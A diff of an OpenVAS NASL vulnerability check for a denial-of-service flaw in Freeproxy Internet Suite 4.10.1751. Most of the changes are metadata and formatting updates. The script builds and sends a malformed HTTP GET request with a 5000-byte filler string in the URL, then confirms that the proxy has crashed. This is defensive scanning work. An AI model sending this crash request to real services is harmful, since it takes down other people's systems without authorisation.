@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_freeproxy_internet_suite_dos_vul.nasl 6158 2017-05-18 08:17:39Z teissa $
+# $Id: gb_freeproxy_internet_suite_dos_vul.nasl 11008 2018-08-16 13:26:16Z cfischer $
 #
 # Freeproxy Internet Suite Denial of Service Vulnerability
 #
@@ -29,37 +29,39 @@ CPE = "cpe:/a:freeproxy_internet_suite:freeproxy";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.806895");
-  script_version("$Revision: 6158 $");
+  script_version("$Revision: 11008 $");
   script_tag(name:"cvss_base", value:"7.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2017-05-18 10:17:39 +0200 (Thu, 18 May 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-16 15:26:16 +0200 (Thu, 16 Aug 2018) $");
   script_tag(name:"creation_date", value:"2016-05-17 11:03:06 +0530 (Tue, 17 May 2016)");
   script_tag(name:"qod_type", value:"remote_vul");
   script_name("Freeproxy Internet Suite Denial of Service Vulnerability");
 
-  script_tag(name:"summary" , value:"This host is installed with Freeproxy
+  script_tag(name:"summary", value:"This host is installed with Freeproxy
   Internet Suite and is prone to denial of service vulnerability.");
 
-  script_tag(name:"vuldetect" , value:"Send a crafted request via HTTP GET
+  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET
   and check whether it is able to crash the application or not.");
 
-  script_tag(name:"insight" , value:"The flaw is due to improper validation of
+  script_tag(name:"insight", value:"The flaw is due to improper validation of
   GET request to the proxy.");
 
-  script_tag(name:"impact" , value:"Successful exploitation will allow remote
+  script_tag(name:"impact", value:"Successful exploitation will allow remote
   attackers to cause the application to crash, creating a denial-of-service
   condition.
 
   Impact Level: Application");
 
-  script_tag(name:"affected" , value:"Freeproxy Internet Suite 4.10.1751");
+  script_tag(name:"affected", value:"Freeproxy Internet Suite 4.10.1751");
 
-  script_tag(name:"solution" , value:"No solution or patch was made available for at least one year since disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.
-");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year
+  since the disclosure of this vulnerability. Likely none will be provided anymore. General
+  solution options are to upgrade to a newer release, disable respective features, remove the
+  product or replace the product by another one.");
 
   script_tag(name:"solution_type", value:"WillNotFix");
 
-  script_xref(name:"URL" , value:"https://www.exploit-db.com/exploits/39517/");
+  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39517/");
 
   script_category(ACT_DENIAL);
   script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
@@ -67,40 +69,38 @@ if(description)
   script_dependencies("gb_freeproxy_internet_suite_detect.nasl");
   script_mandatory_keys("Freeproxy/installed");
   script_require_ports("Services/www", 8080);
+
   exit(0);
 }
-
 
 include("host_details.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Get http Port
 freePort = get_app_port(cpe:CPE);
 if(!freePort){
   exit(0);
-}  
+}
 
 if(http_is_dead(port:freePort)){
   exit(0);
 }
 
-##Contruct Crap data
 junk = crap( data:"A", length:5000 );
 
-##Send request and receive response
+useragent = get_http_user_agent();
+
 buffer  = 'GET http://::../'+junk+'/index.html HTTP/1.1\r\n'+
  	  'Host: www.xyz.com\r\n'+
-	  'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
+	  'User-Agent: ' + useragent + '\r\n' +
 	  '\r\n\r\n';
 
 req = http_keepalive_send_recv(port:freePort, data:buffer);
 
 sleep(3);
 
-##Cofirm exploit
 if(http_is_dead(port:freePort))
 {
-  security_message(port:freePort);  
+  security_message(port:freePort);
 }
 exit(0);
